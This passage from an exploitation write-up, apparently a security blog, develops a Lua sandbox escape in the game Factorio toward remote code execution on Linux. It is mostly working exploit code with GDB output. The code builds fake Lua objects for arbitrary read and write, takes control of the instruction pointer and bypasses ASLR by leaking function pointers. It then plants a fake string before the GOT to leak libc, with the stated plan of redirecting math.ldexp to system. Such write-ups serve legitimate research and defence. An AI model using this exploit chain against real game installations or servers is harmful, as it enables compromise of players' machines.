</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Mantissa: </span><span style="color:#e6db74">{</span>mantissa<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Integer: </span><span style="color:#e6db74">{</span>hex(number)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Double: </span><span style="color:#e6db74">{</span>double<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Output:</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Exponent: 00000000000</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Mantissa: 0000000000000000000001010000010100000101000001010000</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Integer: 0x50505050</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Double: 6.657241696e-315</span>
</span></span></code></pre></div><p>So our code to encode an <code>integer</code> in a <code>double</code> in Lua is as simple as:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-lua" data-lang="lua"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">integer_to_double</span>(integer)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> integer <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">^-</span><span style="color:#ae81ff">1074</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
</span></span></code></pre></div><p>With this small change our write primitive is complete:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-lua" data-lang="lua"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">integer_to_double</span>(integer)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> integer <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">^-</span><span style="color:#ae81ff">1074</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">write</span>(addr, value)
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">-- Encode double as an integer</span>
</span></span><span style="display:flex;"><span>  value <span style="color:#f92672">=</span> integer_to_double(value)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">-- The Fake Upval points to the destination of the write</span>
</span></span><span style="display:flex;"><span>  fakeUpVal <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;AAAABBBBCCCCDDDD&#34;</span><span style="color:#f92672">..</span> ub8(addr) <span style="color:#75715e">-- next/tt/marked + v</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">-- Fake closure that we use to overwrite the real closure</span>
</span></span><span style="display:flex;"><span>  fakeClosure <span style="color:#f92672">=</span> ub8(addr_of(<span style="color:#e6db74">&#34;MemoryCorruption&#34;</span>)) <span style="color:#f92672">..</span> ub8(addr_of(fakeUpVal) <span style="color:#f92672">+</span> <span style="color:#ae81ff">24</span>) <span style="color:#75715e">-- proto + upvals</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  write_primitive(fakeClosure, value)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>write(<span style="color:#ae81ff">0x4545454545</span>, <span style="color:#ae81ff">0x5050505050</span>)
</span></span></code></pre></div><p>We can check in GDB that the correct value is written:</p>
<pre tabindex="0"><code>Program received signal SIGSEGV, Segmentation fault.
0x000000000041a267 in luaV_execute (L=0x43e2a0) at lvm.c:662
*RAX  0x4545454545
 RBX  0
 RCX  1
*RDX  0x5050505050
[ DISASM / x86-64 / set emulate on ]
  0x41a267 &lt;luaV_execute+1416&gt;     mov    qword ptr [rax], rdx
   0x41a26a &lt;luaV_execute+1419&gt;     mov    rax, qword ptr [rbp - 0x338]
   0x41a271 &lt;luaV_execute+1426&gt;     mov    edx, dword ptr [rax + 8]
   0x41a274 &lt;luaV_execute+1429&gt;     mov    rax, qword ptr [rbp - 0x340]
   0x41a27b &lt;luaV_execute+1436&gt;     mov    dword ptr [rax + 8], edx
</code></pre><h4 id="controlling-the-instruction-pointer">Controlling the Instruction Pointer</h4>
<p>Another generic primitive that will be useful in most cases is the ability to control the instruction pointer. To do this, we can either fake a <code>CClosure</code> or a <code>Light C Function</code>. In this case, we are going to use a <code>Light C Function</code>, because this also <strong>reveals a useful leak that we don&rsquo;t know yet</strong>. The difference between both is that a <code>CCLosure</code> can have upvalues, while a <code>Light C Function</code> can not.</p>
<p>As seen in the code, a light function is a variant of the function type and has value <code>22</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#75715e">#define LUA_TFUNCTION		6
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define LUA_TLCF	(LUA_TFUNCTION | (1 &lt;&lt; 4))  </span><span style="color:#75715e">/* light C function */</span><span style="color:#75715e">
</span></span></span></code></pre></div><p>As there are no upvalues, a light function contains the <strong>pointer of the function inline in the TValue</strong>, so the following is a valid <code>TValue</code> of type <code>Light C Function</code> that points to
a function at <code>0xdeadbeef</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-lua" data-lang="lua"><span style="display:flex;"><span><span style="color:#75715e">-- Pointer + Type (LUA_TLCF = 22)</span>
</span></span><span style="display:flex;"><span>fakeTValueArray <span style="color:#f92672">=</span> ub8(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#f92672">..</span> ub8(<span style="color:#ae81ff">22</span>)
</span></span></code></pre></div><p>We can craft this fake function as any other object and call it as any other function</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-lua" data-lang="lua"><span style="display:flex;"><span><span style="color:#75715e">-- Pointer + Type (LUA_TLCF = 22)</span>
</span></span><span style="display:flex;"><span>fakeTValueArray <span style="color:#f92672">=</span> ub8(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#f92672">..</span> ub8(<span style="color:#ae81ff">22</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">-- Fake proto that points the constants array</span>
</span></span><span style="display:flex;"><span>fakeProto <span style="color:#f92672">=</span> ub8(<span style="color:#ae81ff">0x0</span>) <span style="color:#f92672">..</span> ub8(<span style="color:#ae81ff">0x0</span>) <span style="color:#f92672">..</span> ub8(addr_of(fakeTValueArray) <span style="color:#f92672">+</span> <span style="color:#ae81ff">24</span>)
</span></span><span style="display:flex;"><span>fakeClosure <span style="color:#f92672">=</span> ub8(addr_of(fakeProto) <span style="color:#f92672">+</span> <span style="color:#ae81ff">24</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>fake_function <span style="color:#f92672">=</span> craft_object(fakeClosure)
</span></span><span style="display:flex;"><span><span style="color:#75715e">-- Call the fake function</span>
</span></span><span style="display:flex;"><span>fake_function()
</span></span></code></pre></div><p>Doing this will result in control of the instruction pointer, as seen in GDB</p>
<pre tabindex="0"><code>Program received signal SIGSEGV, Segmentation fault.
0x00000000deadbeef in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
[ REGISTERS ]
*RAX  0x43b980  0x440640  0xdeadbeef
 RBX  0x4332a0  0
 RCX  1
 RDX  0
 RDI  0x4332a0  0
 RSI  0x440640  0xdeadbeef
 R8   0x440690  0xdeadbeef
*R9   1
*R10  0x43f860  0x440360  0
*R11  3
 R12  0
 R13  0x70
 R14  0x4405d0  0
 R15  0x434410
 RBP  0xdeadbeef
 RSP  0x7fffffffd888  0x409de7 (luaD_precall+679)
 RIP  0xdeadbeef
[ DISASM / x86-64 / set emulate on ]
Invalid address 0xdeadbeef
</code></pre><p>This is interesting for <strong>two reasons</strong>, the obvious one is that controlling the instruction pointer allow us to further alter the behaviour of the program and opens the door to
ROP chains and such, but the other reason is that as the <strong>pointer of a Light C Function is stored inline we can leak it</strong> with our address leak primitive.</p>
<p>This is great because <strong>functions in Lua are implemented as light C functions</strong>, and that means that <strong>this is an straighforward way to bypass ASLR</strong>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-lua" data-lang="lua"><span style="display:flex;"><span>print(string.format(<span style="color:#e6db74">&#34;Print at: 0x%x&#34;</span>, addr_of(print)))
</span></span></code></pre></div><p>This can be used to bypass ASLR and then <strong>calculate the address of a sandboxed function</strong> to then call it with another fake function to bypass the sandbox</p>
<h1 id="getting-remote-code-execution-on-linux">Getting Remote Code Execution on Linux</h1>
<p>With all these primitives, we now have multiple ways to get RCE in Factorio. We could, for example, make a ROP chain with a fake function to execute code in the target. However, that is not that interesting, we are going to follow a different path so we can play some more tricks and avoid having to write a chain.</p>
<p>The exploitation path is going to be the following:</p>
<ol>
<li>Find an <strong>imported function that we can call from Lua</strong> code where we <em>control the first parameter passed</em></li>
<li><strong>Replace the address of this function with the address of system</strong> in the <em>GOT</em></li>
<li>Call the function with the address of a string to execute commands in the system</li>
</ol>
<p>For those unfamiliar with Linux exploitation, the <em>Global Offset Table</em> (GOT) contains the <strong>address of globals</strong> so they can be located in <em>Position Independent Code</em>. One of the things stored in the GOT are the <strong>resolved addresses of shared libraries functions</strong>. When our code wants to call a function such as <code>printf</code>, it is going to use the address stored in GOT, if we can overwrite an entry, we can make it <strong>call a different function with the parameters of the original function</strong>.</p>
<p>This will prove useful as fake functions <strong>don&rsquo;t give us the ability to pass parameters following the calling convention</strong> (that is, using registers such as <code>RDI</code>), so we could call <code>system</code> but without control of the parameters, which is not great.</p>
<p>If we <strong>find a shared library function that is callable from Lua where the first parameter is controlled by us</strong>, we could replace its address with the address of <code>system</code> to execute commands, as we would have control of the parameter expected by it.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">system</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>command);
</span></span></code></pre></div><h2 id="0-integration-hell">0. Integration Hell?</h2>
<p>Until now, all our testing was done on the <em>official Lua interpreter</em><sup id="fnref:10"><a href="#fn:10" class="footnote-ref" role="doc-noteref">10</a></sup>, as it was easier and faster to work with. By doing this, we trusted that the modified
implementation used in Factorio didn&rsquo;t diverge too much from the official one. In this section, we will make the modifications needed
to run our primitives in Factorio.</p>
<p>In Factorio, <strong>Garbage Collected Objects</strong>, that is things like <code>TString</code>, <code>LClosure</code> or <code>Proto</code> have an extra pointer as part of the <code>CommonHeader</code>.</p>
<p>Factorio:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#75715e">#define CommonHeader	GCObject *previous; GCObject *next; lu_byte tt; lu_byte marked
</span></span></span></code></pre></div><p>Official Lua Intepreter:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#75715e">#define CommonHeader	GCObject *next; lu_byte tt; lu_byte marked
</span></span></span></code></pre></div><p>It seems that in Factorio objects are part of a <em>double linked list</em>, while they are usually part of a <em>single linked list</em>.</p>
<p>For our purposes, this means that some offsets are off by <code>8</code>. For example, the header of a <code>TString</code> is no longer <code>24</code> but <code>32</code>, which breaks our calculation to locate the content of a string and our read primitive.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-lua" data-lang="lua"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">read</span>(fake_string, addr, size)
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">-- First we calculate if the address is reachable from our position</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">local</span> relative_addr <span style="color:#f92672">=</span> addr <span style="color:#f92672">-</span> (addr_of(fake_string) <span style="color:#f92672">+</span> <span style="color:#ae81ff">31</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> relative_addr <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span> <span style="color:#66d9ef">then</span>
</span></span><span style="display:flex;"><span>      print(<span style="color:#e6db74">&#34;[-] Cannot read from &#34;</span> <span style="color:#f92672">..</span> addr)
</span></span><span style="display:flex;"><span>      error()
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">-- Then we obtain the part of the string where the data is located</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> fake_string:sub(relative_addr, relative_addr <span style="color:#f92672">+</span> size <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
</span></span></code></pre></div><p>In addition to changing the calculation of <code>TString</code> addresses, we also have to modify our write primitive, as there is an additional pointer before the <code>TValue</code> pointer:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-lua" data-lang="lua"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">write</span>(addr, value)
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">-- Encode double as an integer</span>
</span></span><span style="display:flex;"><span>  value <span style="color:#f92672">=</span> integer_to_double(value)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">-- The Fake Upval points to the destination of the write</span>
</span></span><span style="display:flex;"><span>  fakeUpVal <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;AAAABBBBCCCCDDDDEEEEFFFF&#34;</span><span style="color:#f92672">..</span> ub8(addr) <span style="color:#75715e">-- previous/next/tt/marked + v</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">-- Fake closure that we use to overwrite the real closure</span>
</span></span><span style="display:flex;"><span>  fakeClosure <span style="color:#f92672">=</span> ub8(addr_of(<span style="color:#e6db74">&#34;MemoryCorruption&#34;</span>)) <span style="color:#f92672">..</span> ub8(addr_of(fakeUpVal) <span style="color:#f92672">+</span> <span style="color:#ae81ff">32</span>) <span style="color:#75715e">-- proto + upvals</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  write_primitive(fakeClosure, value)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
</span></span></code></pre></div><p>However, with only this change our exploit will make the game crash while trying to dereference an invalid pointer.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#a6e22e">mov</span>    <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> <span style="color:#66d9ef">ptr</span> [<span style="color:#66d9ef">rax</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#ae81ff">0x18</span>]     <span style="color:#66d9ef">RAX</span>, [<span style="color:#ae81ff">0xfe32704c00000000</span>]
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Cannot dereference [0xfe32704c00000000]
</span></span></span></code></pre></div><p>That looks like a <em>really corrupted pointer</em> and we already fixed our offsets, so that means&hellip;</p>
<h3 id="its-not-doubles-theres-no-way-its-doubles-it-was-doubles">Its not Doubles, Theres no way its Doubles, It was Doubles</h3>
<p>Unfortunately for us, Factorio seems to be using a version of <em>sprintf</em> that uses a different encoding when the format string <code>%a</code> is used<sup id="fnref:11"><a href="#fn:11" class="footnote-ref" role="doc-noteref">11</a></sup>. This is breaking our
conversion from a <em>fake double</em> to a real double.</p>
<p>For example, if we leak the value <code>2.1038461432219e-316</code> we would expect the following string after calling <code>string.format(&quot;%.13a&quot;, 2.1038461432219e-316)</code>:</p>
<pre tabindex="0"><code>0x0.000000289c130p-1022 -&gt; 0x289c130
</code></pre><p>However, we instead got:</p>
<pre tabindex="0"><code>0xa.2704c00000000p-1052 -&gt; 0xfe32704c00000000
</code></pre><p>This completely breaks the code we made. Maybe depending on libraries <em>was not a great idea</em>.</p>
<p>Now that we have a better understanding of doubles, <strong>let&rsquo;s write a completely numeric approach</strong>, like is done in other writeups <sup id="fnref:12"><a href="#fn:12" class="footnote-ref" role="doc-noteref">12</a></sup></p>
<p>As we know, <code>2^-1074</code> is the smallest number possible, as it is a denormalized number with only the last bit set</p>
<pre tabindex="0"><code>Exponent: 00000000000
Mantissa: 0000000000000000000000000000000000000000000000000001
</code></pre><p>We used this to force a representation of an integer in a double, but we can actually do the <strong>opposite operation</strong>.</p>
<p>Let&rsquo;s see it with an example. Imagine we leak the pointer <code>0x289c130</code> using our leak primitive, if we try to print it, we get the value <code>2.1038461432219e-316</code>, <em>how can we get the original number?</em></p>
<p>The trick is in understanding that in denormalized form, the position of the bits in the mantissa matter, as bits to the right represent smaller numbers. This is why even if all pointers are integers, they don&rsquo;t have the same exponent when considered a double, as the position of the rightmost bit changes</p>
<pre tabindex="0"><code>Exponent 00000000000
Mantissa: 0000000000000000000000000010100010011100000100110000
</code></pre><p>This behaviour can make us think that the operation we need to do depends on the exponent provided by Lua, while in reality <strong>it does not matter at all</strong>. Think about it, no matter the integer,
the value always starts at the rightmost bit, so in reality, we can consider <strong>all integers to have exponent -1074</strong> when represented as a double, which is exactly what we did in the oppsite operation.</p>
<p>So all this means that by doing <code>leak * 2**1074</code> we can recover the original number</p>

<div class="alert alert-warning">We have to split the multiplication in two parts as <code>2**1074</code> is not representable as a double (remember that the highest exponent is <code>1023</code>)
</div>

<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-lua" data-lang="lua"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">double_to_number</span>(double)
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> double <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">^</span><span style="color:#ae81ff">52</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">^</span><span style="color:#ae81ff">1022</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
</span></span></code></pre></div><p>You can also see it in the following way: the first multiplication makes sure the number is no longer <em>denormalized</em>, as they are represented in the mantissa, which has <strong>52 bits</strong>, while the second multiplication makes the exponent positive, as the smallest negative exponent in a normal number is <code>-1022</code>. After doing this, the double now properly encodes the integer leaked</p>
<h2 id="1-function-to-replace-with-system">1. Function to replace with System</h2>
<p>Now that our primitives work in Factorio, let&rsquo;s finally get to RCE. First, for our idea to work, we need an imported function that we can call from Lua for which we control the first parameter.</p>
<p>The Lua version in Factorio is pretty limited in terms of available libraries, but fortunately, the <code>math</code> library has a perfect example of this at <code>math_ldexp</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">math_ldexp</span> (lua_State <span style="color:#f92672">*</span>L) {
</span></span><span style="display:flex;"><span>  lua_pushnumber(L, l_tg(ldexp)(luaL_checknumber(L, <span style="color:#ae81ff">1</span>), luaL_checkint(L, <span style="color:#ae81ff">2</span>)));
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>We can see on gdb that the second parameter is passed as the first parameter (RDI) on the libc call</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-lua" data-lang="lua"><span style="display:flex;"><span>math.ldexp(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x454545454</span>) <span style="color:#75715e">-- This will call system(0x289c150)</span>
</span></span></code></pre></div><pre tabindex="0"><code>Thread 24 &#34;factorio&#34; hit Breakpoint 2.3, __ldexp (value=0, exp=1414812756) at ./s_ldexp_template.c:22
22	{
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
[ REGISTERS / show-flags off / show-compact-regs off ]
*RAX  0x160
*RBX  0x7fff9400ded0  0x0
*RCX  0x7fff94059660  0x0
*RDX  0x7fff94059650  0x1ab8ea0 (math_ldexp(lua_State*))  push rbp
*RDI  0x54545454
</code></pre><p>This makes this function suitable to be replaced with the address of system, as we already know that the command is passed as the first parameter</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">system</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>command);
</span></span></code></pre></div><h2 id="2-replacing-the-address-of-ldexp-with-system">2. Replacing the Address of ldexp with system</h2>
<p>Now that we found a function that is suitable to be replace with system, we need to overwrite it&rsquo;s address with the address of system, but to do that, we first need to locate system in memory, as the target has <strong>ASLR enabled</strong>.</p>
<p>This shouldn&rsquo;t be a problem, right? We have our read primitive. However, there is a <em>small problem</em>, the GOT table is located before the Heap, so our read primitive is unable to leak it, as we can only leak
data <strong>after our string header</strong>.</p>
<p>We could search in heap for pointers to libc but that is not as reliable, is there anything we can do to avoid this? Yes, there is.</p>
<p>As we also have a write-what-where primitive, why don&rsquo;t we craft a <code>TString</code> before the GOT table? It should be possible, right?</p>
<p>There are two ways to do this, we could search in memory for some data that resembles a <code>TString</code> structure before the GOT that we can use as our fake <code>TString</code>, our we can write our own.</p>
<p>In this case, as there is a writable segment before the GOT, we can just use that</p>
<pre tabindex="0"><code>       Type                     Load Address                Perm  Section Name
  ---------------- ---------------------------------------  ----  ------------
  container        [0x0000000000400000-0x000000000289aec0)  r-x PT_LOAD[0]
  regular          [0x0000000000400238-0x0000000000400254)  r-- interp
  regular          [0x0000000000400254-0x0000000000400274)  r-- note.ABI-tag
  dynamic-symbols  [0x0000000000400278-0x00000000004035a8)  r-- dynsym
  regular          [0x00000000004035a8-0x0000000000405151)  r-- dynstr
  regular          [0x0000000000405158-0x000000000040620c)  r-- hash
  regular          [0x000000000040620c-0x0000000000406650)  r-- gnu.version
  regular          [0x0000000000406650-0x0000000000406890)  r-- gnu.version_r
  rel-entries      [0x0000000000406890-0x00000000004069b0)  r-- rela.dyn
  rel-entries      [0x00000000004069b0-0x0000000000409b18)  r-- rela.plt
  code             [0x0000000000409b18-0x0000000000409b37)  r-x init
  code             [0x0000000000409b40-0x000000000040bc40)  r-x plt
  code             [0x000000000040c000-0x00000000020f1f71)  r-x text
  code             [0x00000000020f1f74-0x00000000020f1f7d)  r-x fini
  regular          [0x00000000020f1f80-0x0000000002491250)  r-- rodata
  regular          [0x0000000002491250-0x000000000256d545)  r-- gcc_except_table
  eh-frame         [0x000000000256d548-0x000000000280ecf4)  r-- eh_frame
  regular          [0x000000000280ecf4-0x000000000289aec0)  r-- eh_frame_hdr
  container        [0x000000000289bec0-0x0000000002902f90)  rw- PT_LOAD[1]
  // RW Section before GOT
  dyn-link-info    [0x000000000289bec0-0x000000000289c180)  rw- dynamic
  regular          [0x000000000289c180-0x000000000289df00)  rw- got
  regular          [0x000000000289df00-0x000000000289ef90)  rw- got.pl
</code></pre><p>With our primitives is very straighforward to create this fake string before the GOT and return it as a fake object</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-lua" data-lang="lua"><span style="display:flex;"><span><span style="color:#75715e">-- Clear previous fields and write arbitrary len</span>
</span></span><span style="display:flex;"><span>write(<span style="color:#ae81ff">0x289c130</span>, <span style="color:#ae81ff">0x0</span>)
</span></span><span style="display:flex;"><span>write(<span style="color:#ae81ff">0x289c138</span>, <span style="color:#ae81ff">0x0</span>)
</span></span><span style="display:flex;"><span>write(<span style="color:#ae81ff">0x289c140</span>, <span style="color:#ae81ff">0x0</span>)
</span></span><span style="display:flex;"><span>write(<span style="color:#ae81ff">0x289c148</span>, <span style="color:#ae81ff">0xfffffffffffffff</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">-- Here we create a fake TValue that points to our fake TString before the GOT</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">-- Value + Type (LUA_TSTRING = 4)</span>
</span></span><span style="display:flex;"><span>fakeTValue <span style="color:#f92672">=</span> ub8(<span style="color:#ae81ff">0x289c130</span>) <span style="color:#f92672">..</span> ub8(<span style="color:#ae81ff">4</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">-- Array of Upvals</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">-- previous + next + tt/marked/padding + v</span>
</span></span><span style="display:flex;"><span>fakeUpVal <span style="color:#f92672">=</span> ub8(<span style="color:#ae81ff">0x0</span>) <span style="color:#f92672">..</span> ub8(<span style="color:#ae81ff">0x0</span>) <span style="color:#f92672">..</span> ub8(addr_of(fakeTValue) <span style="color:#f92672">+</span> <span style="color:#ae81ff">32</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">-- Fake proto that points the constants array</span>
</span></span><span style="display:flex;"><span>fakeConstant <span style="color:#f92672">=</span> ub8(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">..</span> ub8(<span style="color:#ae81ff">3</span>) <span style="color:#75715e">-- Value + Type (LUA_TNUMBER = 3)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">-- previous + next + tt/marked/padding + k</span>
</span></span><span style="display:flex;"><span>fakeProto <span style="color:#f92672">=</span> ub8(<span style="color:#ae81ff">0x0</span>) <span style="color:#f92672">..</span> ub8(<span style="color:#ae81ff">0x0</span>) <span style="color:#f92672">..</span> ub8(<span style="color:#ae81ff">0x0</span>) <span style="color:#f92672">..</span> ub8(addr_of(fakeConstant) <span style="color:#f92672">+</span> <span style="color:#ae81ff">32</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">-- Fake closure that we use to overwrite the real closure</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">-- proto + upvals (-8 as in Factorio UpVal has an</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">-- extra pointer that breaks alignment)</span>
</span></span><span style="display:flex;"><span>fakeClosure <span style="color:#f92672">=</span> ub8(addr_of(fakeProto) <span style="color:#f92672">+</span> <span style="color:#ae81ff">32</span>) <span style="color:#f92672">..</span> ub8(addr_of(fakeUpVal) <span style="color:#f92672">+</span> <span style="color:#ae81ff">32</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">8</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>fakeObjects <span style="color:#f92672">=</span> {}
</span></span><span style="display:flex;"><span>fake <span style="color:#f92672">=</span> poc(fakeClosure, fakeObjects) <span style="color:#75715e">-- Replace Closure with our fake TValue</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(string.format(<span style="color:#e6db74">&#34;Size of string: %x&#34;</span>, <span style="color:#f92672">#</span>fakeObjects[<span style="color:#ae81ff">0</span>]))
</span></span></code></pre></div><p>With this, we can easily leak the address of a libc function to bypass ASLR</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-lua" data-lang="lua"><span style="display:flex;"><span><span style="color:#75715e">-- Leak pointer from GOT</span>
</span></span><span style="display:flex;"><span>memcpy <span style="color:#f92672">=</span> ubNumber(read(fakeObjects[<span style="color:#ae81ff">0</span>], <span style="color:#ae81ff">0x289df40</span>, <span style="color:#ae81ff">8</span>))
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;[*] memcpy addr: 0x&#34;</span> <span style="color:#f92672">..</span> string.format(<span style="color:#e6db74">&#34;%x&#34;</span>, memcpy))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">-- Offsets for LIBC 2.38 (Fedora 39)</span>
</span></span><span style="display:flex;"><span>libc_base <span style="color:#f92672">=</span> memcpy <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x138b80</span>
